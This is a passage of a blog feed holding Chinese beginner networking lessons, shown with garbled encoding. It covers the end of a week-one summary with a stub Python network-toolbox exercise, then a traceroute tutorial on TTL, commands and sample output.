class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># day08_network_toolbox.py</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">NetworkToolbox</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">ping</span>(<span class="hljs-params">self, host</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;æµ‹è¯•è¿é€šæ€§&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">traceroute</span>(<span class="hljs-params">self, host</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;è¿½è¸ªè·¯ç”±&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_ports</span>(<span class="hljs-params">self, host, ports</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;æ‰«æç«¯å£&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_lan</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;æ‰«æå±€åŸŸç½‘&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">dns_lookup</span>(<span class="hljs-params">self, domain</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;DNSæŸ¥è¯¢&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_network_info</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;è·å–æœ¬æœºç½‘ç»œä¿¡æ¯&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    toolbox = NetworkToolbox()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=== ç½‘ç»œè¯Šæ–­å·¥å…·ç®± ===&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1. Pingæµ‹è¯•&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;2. è·¯ç”±è¿½è¸ª&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;3. ç«¯å£æ‰«æ&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;4. å±€åŸŸç½‘æ‰«æ&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;5. DNSæŸ¥è¯¢&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;6. ç½‘ç»œä¿¡æ¯&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;0. é€€å‡º&quot;</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        choice = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\nè¯·é€‰æ‹©åŠŸèƒ½: &quot;</span>)<br>        <span class="hljs-comment"># æ ¹æ®choiceè°ƒç”¨ç›¸åº”åŠŸèƒ½</span><br>        ...<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p><strong>è¯„åˆ†æ ‡å‡†</strong>ï¼š</p><ul><li>åŠŸèƒ½å®Œæ•´æ€§ï¼š40åˆ†</li><li>ä»£ç è´¨é‡ï¼š30åˆ†</li><li>ç”¨æˆ·ä½“éªŒï¼š20åˆ†</li><li>åˆ›æ–°æ€§ï¼š10åˆ†</li></ul><h2 id="ğŸ“Š-è‡ªæˆ‘è¯„ä¼°">ğŸ“Š è‡ªæˆ‘è¯„ä¼°</h2><h3 id="æ£€æŸ¥æ¸…å•">æ£€æŸ¥æ¸…å•</h3><p>å®Œæˆæœ¬å‘¨å­¦ä¹ åï¼Œä½ åº”è¯¥èƒ½å¤Ÿï¼š</p><ul><li>[ ] è§£é‡Šä»€ä¹ˆæ˜¯è®¡ç®—æœºç½‘ç»œ</li><li>[ ] è¯´å‡ºç½‘ç»œçš„ä¸‰ç§åˆ†ç±»</li><li>[ ] ç”»å‡ºäº”ç§ç½‘ç»œæ‹“æ‰‘ç»“æ„</li><li>[ ] åˆ—å‡ºOSIä¸ƒå±‚æ¨¡å‹çš„æ¯ä¸€å±‚</li><li>[ ] è¯´æ˜TCP/IPå››å±‚æ¨¡å‹</li><li>[ ] ç†è§£æ•°æ®åŒ…çš„å°è£…è¿‡ç¨‹</li><li>[ ] ä½¿ç”¨pingå‘½ä»¤æµ‹è¯•ç½‘ç»œ</li><li>[ ] ä½¿ç”¨tracerouteè¿½è¸ªè·¯ç”±</li><li>[ ] ä½¿ç”¨WiresharkæŠ“åŒ…</li><li>[ ] ç¼–å†™ç®€å•çš„ç½‘ç»œè¯Šæ–­ç¨‹åº</li></ul><h3 id="æŒæ¡ç¨‹åº¦è¯„ä¼°">æŒæ¡ç¨‹åº¦è¯„ä¼°</h3><p>ä¸ºæ¯ä¸ªçŸ¥è¯†ç‚¹æ‰“åˆ†ï¼ˆ1-5åˆ†ï¼‰ï¼š</p><table><thead><tr><th>çŸ¥è¯†ç‚¹</th><th>æŒæ¡ç¨‹åº¦</th></tr></thead><tbody><tr><td>ç½‘ç»œåŸºç¡€æ¦‚å¿µ</td><td>â–¡â–¡â–¡â–¡â–¡</td></tr><tr><td>ç½‘ç»œåˆ†ç±»å’Œæ‹“æ‰‘</td><td>â–¡â–¡â–¡â–¡â–¡</td></tr><tr><td>OSIä¸ƒå±‚æ¨¡å‹</td><td>â–¡â–¡â–¡â–¡â–¡</td></tr><tr><td>TCP/IPå››å±‚æ¨¡å‹</td><td>â–¡â–¡â–¡â–¡â–¡</td></tr><tr><td>å¸¸ç”¨åè®®ç†è§£</td><td>â–¡â–¡â–¡â–¡â–¡</td></tr><tr><td>pingå‘½ä»¤ä½¿ç”¨</td><td>â–¡â–¡â–¡â–¡â–¡</td></tr><tr><td>tracerouteä½¿ç”¨</td><td>â–¡â–¡â–¡â–¡â–¡</td></tr><tr><td>Wiresharkä½¿ç”¨</td><td>â–¡â–¡â–¡â–¡â–¡</td></tr><tr><td>ç½‘ç»œç¼–ç¨‹åŸºç¡€</td><td>â–¡â–¡â–¡â–¡â–¡</td></tr></tbody></table><p>å¦‚æœæŸé¡¹ä½äº3åˆ†ï¼Œå»ºè®®å¤ä¹ å¯¹åº”ç« èŠ‚ã€‚</p><h2 id="ğŸ’¡-å­¦ä¹ å¿ƒå¾—">ğŸ’¡ å­¦ä¹ å¿ƒå¾—</h2><p><strong>æ€è€ƒé¢˜</strong>ï¼š</p><ol><li>æœ¬å‘¨å­¦ä¹ ä¸­ï¼Œå“ªä¸ªçŸ¥è¯†ç‚¹ä½ è§‰å¾—æœ€éš¾ç†è§£ï¼Ÿ</li><li>å“ªä¸ªå®æˆ˜é¡¹ç›®ä½ è§‰å¾—æœ€æœ‰è¶£ï¼Ÿ</li><li>ä½ é‡åˆ°äº†ä»€ä¹ˆå›°éš¾ï¼Ÿå¦‚ä½•è§£å†³çš„ï¼Ÿ</li><li>å¯¹ä¸‹å‘¨çš„å­¦ä¹ æœ‰ä»€ä¹ˆæœŸå¾…ï¼Ÿ</li></ol><p><strong>å»ºè®®</strong>ï¼š</p><ul><li>å†™ä¸‹ä½ çš„å­¦ä¹ å¿ƒå¾—</li><li>è®°å½•é‡åˆ°çš„é—®é¢˜å’Œè§£å†³æ–¹æ³•</li><li>æ•´ç†ç¬”è®°ï¼Œå»ºç«‹çŸ¥è¯†ä½“ç³»</li><li>å¤šåŠ¨æ‰‹å®è·µï¼Œå…‰çœ‹ä¸ç»ƒå‡æŠŠå¼</li></ul><h2 id="ğŸ¯-ä¸‹å‘¨é¢„å‘Š">ğŸ¯ ä¸‹å‘¨é¢„å‘Š</h2><p><strong>ç¬¬äºŒå‘¨ï¼šæ·±å…¥ç†è§£ç½‘ç»œæ¨¡å‹</strong></p><p>æˆ‘ä»¬å°†å­¦ä¹ ï¼š</p><ul><li>ç¬¬8å¤©ï¼šIPåœ°å€è¯¦è§£</li><li>ç¬¬9å¤©ï¼šå­ç½‘åˆ’åˆ†å®æˆ˜</li><li>ç¬¬10å¤©ï¼šMACåœ°å€å’ŒARPåè®®</li><li>ç¬¬11å¤©ï¼šç«¯å£å’ŒSocketæ·±å…¥</li><li>ç¬¬12å¤©ï¼šDNSåè®®è¯¦è§£</li><li>ç¬¬13å¤©ï¼šDHCPåè®®</li><li>ç¬¬14å¤©ï¼šç¬¬äºŒå‘¨æ€»ç»“å’Œé¡¹ç›®</li></ul><p><strong>é¢„ä¹ å»ºè®®</strong>ï¼š</p><ul><li>å¤ä¹ æœ¬å‘¨çš„IPåœ°å€æ¦‚å¿µ</li><li>äº†è§£äºŒè¿›åˆ¶å’Œåè¿›åˆ¶è½¬æ¢</li><li>æ€è€ƒï¼šä¸ºä»€ä¹ˆéœ€è¦å­ç½‘åˆ’åˆ†ï¼Ÿ</li></ul><h2 id="ğŸ†-æˆå°±è§£é”">ğŸ† æˆå°±è§£é”</h2><p>æ­å–œä½ å®Œæˆç¬¬ä¸€å‘¨çš„å­¦ä¹ ï¼ä½ å·²ç»è§£é”ï¼š</p><p>âœ… <strong>ç½‘ç»œå…¥é—¨è€…</strong>ï¼šå®Œæˆç¬¬ä¸€å‘¨æ‰€æœ‰å†…å®¹<br>âœ… <strong>æŠ“åŒ…æ–°æ‰‹</strong>ï¼šå­¦ä¼šä½¿ç”¨Wireshark<br>âœ… <strong>è¯Šæ–­åŠ©æ‰‹</strong>ï¼šä¼šä½¿ç”¨pingå’Œtraceroute<br>âœ… <strong>ä»£ç å®è·µè€…</strong>ï¼šç¼–å†™äº†5ä¸ªç½‘ç»œå·¥å…·</p><p><strong>ç»§ç»­åŠ æ²¹ï¼Œå‘ç€ç½‘ç»œå¤§å¸ˆçš„ç›®æ ‡å‰è¿›ï¼</strong> ğŸ’ª</p><hr><h2 id="ğŸ“š-å‚è€ƒèµ„æ–™">ğŸ“š å‚è€ƒèµ„æ–™</h2><h3 id="æ¨èä¹¦ç±">æ¨èä¹¦ç±</h3><ul><li>ã€Šè®¡ç®—æœºç½‘ç»œï¼šè‡ªé¡¶å‘ä¸‹æ–¹æ³•ã€‹</li><li>ã€Šå›¾è§£TCP/IPã€‹</li><li>ã€Šç½‘ç»œæ˜¯æ€æ ·è¿æ¥çš„ã€‹</li></ul><h3 id="åœ¨çº¿èµ„æº">åœ¨çº¿èµ„æº</h3><ul><li>Wiresharkå®˜æ–¹æ–‡æ¡£ï¼š<a href="https://www.wireshark.org/docs/">https://www.wireshark.org/docs/</a></li><li>RFCæ–‡æ¡£åº“ï¼š<a href="https://www.rfc-editor.org/">https://www.rfc-editor.org/</a></li><li>TCP/IPæŒ‡å—ï¼šå„å¤§æŠ€æœ¯åšå®¢</li></ul><h3 id="ç»ƒä¹ ç½‘ç«™">ç»ƒä¹ ç½‘ç«™</h3><ul><li>HackerRankç½‘ç»œé¢˜ç›®</li><li>LeetCodeç½‘ç»œç›¸å…³é¢˜</li><li>å®éªŒæ¥¼ç½‘ç»œè¯¾ç¨‹</li></ul><hr><p>ğŸ’¡ <strong>æœ¬å‘¨é‡‘å¥</strong>ï¼šåƒé‡Œä¹‹è¡Œå§‹äºè¶³ä¸‹ï¼Œç½‘ç»œå­¦ä¹ è´µåœ¨åšæŒï¼</p><p>ğŸ‘‰ <a href="day01.md">è¿”å›ç¬¬1å¤©</a> | <a href="../../README.md">è¿”å›ç›®å½•</a> | <a href="../week02/day08.md">è¿›å…¥ç¬¬2å‘¨</a></p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>6å¤©ï¼šç½‘ç»œå‘½ä»¤è¿›é˜¶ - traceroute</title>
    <link href="/2025/11/10/6%E5%A4%A9%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E8%BF%9B%E9%98%B6%20-%20traceroute/"/>
    <url>/2025/11/10/6%E5%A4%A9%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E8%BF%9B%E9%98%B6%20-%20traceroute/</url>
    
    <content type="html"><![CDATA[<h1>ç¬¬6å¤©ï¼šç½‘ç»œå‘½ä»¤è¿›é˜¶ - traceroute</h1><blockquote><p>â€œçœ‹çœ‹æ•°æ®åŒ…æ˜¯æ€æ ·ç¯æ¸¸ä¸–ç•Œçš„ã€‚â€</p></blockquote><h2 id="ğŸ“š-ä»Šæ—¥ç›®æ ‡">ğŸ“š ä»Šæ—¥ç›®æ ‡</h2><ul><li>ç†è§£tracerouteçš„å·¥ä½œåŸç†</li><li>æŒæ¡å¦‚ä½•è¿½è¸ªç½‘ç»œè·¯å¾„</li><li>æ·±å…¥ç†è§£TTLçš„ä½œç”¨æœºåˆ¶</li><li>ç¼–å†™è‡ªå·±çš„tracerouteå·¥å…·</li></ul><h2 id="ğŸ¯-ä»€ä¹ˆæ˜¯tracerouteï¼Ÿ">ğŸ¯ ä»€ä¹ˆæ˜¯tracerouteï¼Ÿ</h2><h3 id="ç”Ÿæ´»ä¸­çš„ä¾‹å­">ç”Ÿæ´»ä¸­çš„ä¾‹å­</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">traceroute</span> <span class="hljs-operator">=</span> è¿½è¸ªå¿«é€’è·¯çº¿<br><br>ä½ çš„åŒ…è£¹ä»åŒ—äº¬åˆ°ä¸Šæµ·ï¼š<br>åŒ—äº¬ â†’ çŸ³å®¶åº„ä¸­è½¬ç«™ â†’ æµå—ä¸­è½¬ç«™ â†’ å—äº¬ä¸­è½¬ç«™ â†’ ä¸Šæµ·<br><br>tracerouteå°±æ˜¯æ˜¾ç¤ºæ•°æ®åŒ…ç»è¿‡çš„æ‰€æœ‰<span class="hljs-string">&quot;ä¸­è½¬ç«™&quot;</span>ï¼ˆè·¯ç”±å™¨ï¼‰<br></code></pre></td></tr></table></figure><p><strong>traceroute</strong>ï¼ˆWindowsä¸Šå«tracertï¼‰æ˜¯ç”¨æ¥æ˜¾ç¤ºæ•°æ®åŒ…ä»æºåˆ°ç›®çš„åœ°æ‰€ç»è¿‡çš„è·¯ç”±è·¯å¾„çš„å·¥å…·ã€‚</p><h3 id="tracerouteçš„ä½œç”¨">tracerouteçš„ä½œç”¨</h3><ol><li><strong>è¯Šæ–­ç½‘ç»œæ•…éšœ</strong>ï¼šæ‰¾å‡ºå“ªä¸ªè·¯ç”±å™¨å‡ºé—®é¢˜äº†</li><li><strong>åˆ†æç½‘ç»œè·¯å¾„</strong>ï¼šäº†è§£æ•°æ®åŒ…çš„ä¼ è¾“è·¯çº¿</li><li><strong>æµ‹é‡å»¶è¿Ÿ</strong>ï¼šçœ‹æ¯ä¸€è·³çš„å»¶è¿Ÿ</li><li><strong>å‘ç°ç½‘ç»œç“¶é¢ˆ</strong>ï¼šæ‰¾å‡ºå“ªé‡Œæœ€æ…¢</li></ol><h2 id="ğŸ”-tracerouteçš„å·¥ä½œåŸç†">ğŸ” tracerouteçš„å·¥ä½œåŸç†</h2><h3 id="æ ¸å¿ƒæ€æƒ³ï¼šåˆ©ç”¨TTL">æ ¸å¿ƒæ€æƒ³ï¼šåˆ©ç”¨TTL</h3><p>è¿˜è®°å¾—æ˜¨å¤©å­¦çš„TTLå—ï¼Ÿ</p><ul><li>æ¯ä¸ªæ•°æ®åŒ…éƒ½æœ‰TTLï¼ˆTime To Liveï¼‰</li><li>æ¯ç»è¿‡ä¸€ä¸ªè·¯ç”±å™¨ï¼ŒTTLå‡1</li><li>å½“TTL=0æ—¶ï¼Œè·¯ç”±å™¨ä¸¢å¼ƒæ•°æ®åŒ…ï¼Œå¹¶è¿”å›&quot;è¶…æ—¶&quot;é”™è¯¯ï¼ˆICMP Time Exceededï¼‰</li></ul><p><strong>tracerouteçš„å·§å¦™ä¹‹å¤„</strong>ï¼šæ•…æ„è®¾ç½®å°çš„TTLå€¼ï¼</p><h3 id="å®Œæ•´æµç¨‹">å®Œæ•´æµç¨‹</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ç¬¬1æ­¥ï¼šå‘é€<span class="hljs-attribute">TTL</span>=1çš„åŒ…<br>â”Œâ”€â”€â”€â”€â”€â”€â”  <span class="hljs-attribute">TTL</span>=1   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ ä½ çš„ â”‚ â”€â”€â”€â”€â”€â”€â”€&gt; â”‚ è·¯ç”±å™¨1 â”‚<br>â”‚ ç”µè„‘ â”‚          â””â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>â””â”€â”€â”€â”€â”€â”€â”˜          TTLå˜æˆ0ï¼<br>                  è¿”å›<span class="hljs-string">&quot;è¶…æ—¶&quot;</span>æ¶ˆæ¯<br>                  (ICMP Time Exceeded)<br><br>â†’ å¾—çŸ¥ç¬¬1è·³æ˜¯è·¯ç”±å™¨1<br><br>ç¬¬2æ­¥ï¼šå‘é€<span class="hljs-attribute">TTL</span>=2çš„åŒ…<br>â”Œâ”€â”€â”€â”€â”€â”€â”  <span class="hljs-attribute">TTL</span>=2   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”  <span class="hljs-attribute">TTL</span>=1   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ ä½ çš„ â”‚ â”€â”€â”€â”€â”€â”€â”€&gt; â”‚ è·¯ç”±å™¨1 â”‚ â”€â”€â”€â”€â”€â”€â”€&gt; â”‚ è·¯ç”±å™¨2 â”‚<br>â”‚ ç”µè„‘ â”‚          â””â”€â”€â”€â”€â”€â”€â”€â”€â”˜          â””â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>â””â”€â”€â”€â”€â”€â”€â”˜                              TTLå˜æˆ0ï¼<br>                                      è¿”å›<span class="hljs-string">&quot;è¶…æ—¶&quot;</span>æ¶ˆæ¯<br><br>â†’ å¾—çŸ¥ç¬¬2è·³æ˜¯è·¯ç”±å™¨2<br><br>ç¬¬3æ­¥ï¼šå‘é€<span class="hljs-attribute">TTL</span>=3çš„åŒ…<br>ï¼ˆä¾æ­¤ç±»æ¨ï¼Œç›´åˆ°åˆ°è¾¾ç›®çš„åœ°ï¼‰<br></code></pre></td></tr></table></figure><h3 id="å›¾è§£ç¤ºæ„">å›¾è§£ç¤ºæ„</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs 1c">ä½ çš„ç”µè„‘ <span class="hljs-punctuation">(</span><span class="hljs-number">192.168</span>.<span class="hljs-number">1.100</span><span class="hljs-punctuation">)</span><br>    <span class="hljs-string">|</span><br>    <span class="hljs-string">| TTL=1</span><br>    v<br>è·¯ç”±å™¨<span class="hljs-number">1</span> <span class="hljs-punctuation">(</span><span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span><span class="hljs-punctuation">)</span>     â†’ è¿”å›<span class="hljs-punctuation">:</span> Time Exceeded<br>    <span class="hljs-string">|</span><br>    <span class="hljs-string">| TTL=2</span><br>    v<br>è·¯ç”±å™¨<span class="hljs-number">2</span> <span class="hljs-punctuation">(</span><span class="hljs-number">10.0</span>.<span class="hljs-number">0.1</span><span class="hljs-punctuation">)</span>        â†’ è¿”å›<span class="hljs-punctuation">:</span> Time Exceeded<br>    <span class="hljs-string">|</span><br>    <span class="hljs-string">| TTL=3</span><br>    v<br>è·¯ç”±å™¨<span class="hljs-number">3</span> <span class="hljs-punctuation">(</span><span class="hljs-number">61.135</span>.<span class="hljs-number">169.1</span><span class="hljs-punctuation">)</span>    â†’ è¿”å›<span class="hljs-punctuation">:</span> Time Exceeded<br>    <span class="hljs-string">|</span><br>    <span class="hljs-string">| TTL=4</span><br>    v<br>ç›®æ ‡æœåŠ¡å™¨ <span class="hljs-punctuation">(</span><span class="hljs-number">220.181</span>.<span class="hljs-number">38.148</span><span class="hljs-punctuation">)</span> â†’ è¿”å›<span class="hljs-punctuation">:</span> Echo Reply<br></code></pre></td></tr></table></figure><h2 id="ğŸ”§-ä½¿ç”¨tracerouteå‘½ä»¤">ğŸ”§ ä½¿ç”¨tracerouteå‘½ä»¤</h2><h3 id="åŸºæœ¬ç”¨æ³•">åŸºæœ¬ç”¨æ³•</h3><p><strong>Linux/Mac</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># åŸºæœ¬traceroute</span><br>traceroute baidu.com<br><br><span class="hljs-comment"># é™åˆ¶æœ€å¤§è·³æ•°</span><br>traceroute -m 20 baidu.com<br><br><span class="hljs-comment"># ä¸è§£æåŸŸåï¼ˆæ›´å¿«ï¼‰</span><br>traceroute -n baidu.com<br><br><span class="hljs-comment"># ä½¿ç”¨ICMPè€Œä¸æ˜¯UDP</span><br>traceroute -I baidu.com<br></code></pre></td></tr></table></figure><p><strong>Windows</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># åŸºæœ¬tracert</span><br>tracert baidu.com<br><br><span class="hljs-comment"># é™åˆ¶æœ€å¤§è·³æ•°</span><br>tracert -h 20 baidu.com<br><br><span class="hljs-comment"># ä¸è§£æåŸŸå</span><br>tracert -d baidu.com<br></code></pre></td></tr></table></figure><h3 id="è¾“å‡ºè§£æ">è¾“å‡ºè§£æ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ traceroute baidu.com<br><br>traceroute to baidu.com (220.181.38.148), 30 hops max, 60 byte packets<br> 1  192.168.1.1 (192.168.1.1)          1.234 ms  1.123 ms  1.089 ms<br> 2  10.0.0.1 (10.0.0.1)                5.678 ms  5.432 ms  5.345 ms<br> 3  61.135.169.1 (61.135.169.1)        12.345 ms 12.234 ms 12.123 ms<br> 4  61.135.169.125 (61.135.169.125)    15.678 ms 15.567 ms 15.456 ms<br> 5  * * *<br> 6  220.181.38.148 (220.181.38.148)    28.901 ms 28.789 ms 28.678 ms<br></code></pre></td></tr></table></figure><p><strong>å­—æ®µå«ä¹‰</strong>ï¼š</p><ul><li>ç¬¬1åˆ—ï¼šè·³æ•°ï¼ˆhop numberï¼‰</li><li>ç¬¬2åˆ—ï¼šè·¯ç”±å™¨çš„IPåœ°å€å’Œä¸»æœºå</li><li>å3åˆ—ï¼šä¸‰æ¬¡æµ‹è¯•çš„RTTï¼ˆå¾€è¿”æ—¶é—´ï¼‰</li><li><code>* * *</code>ï¼šè¯¥è·¯ç”±å™¨æ²¡æœ‰å›åº”ï¼ˆå¯èƒ½ç¦ç”¨äº†ICMPï¼‰</li></ul><h2 id="ğŸ”§-å®æˆ˜é¡¹ç›®ï¼šå®ç°ç®€æ˜“tracerouteå·¥å…·">ğŸ”§ å®æˆ˜é¡¹ç›®ï¼šå®ç°ç®€æ˜“tracerouteå·¥å…·</h2><p>è®©æˆ‘ä»¬ç”¨Pythonå®ç°tracerouteï¼</p><h3 id="ä»£ç å®ç°">ä»£ç å®ç°</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span 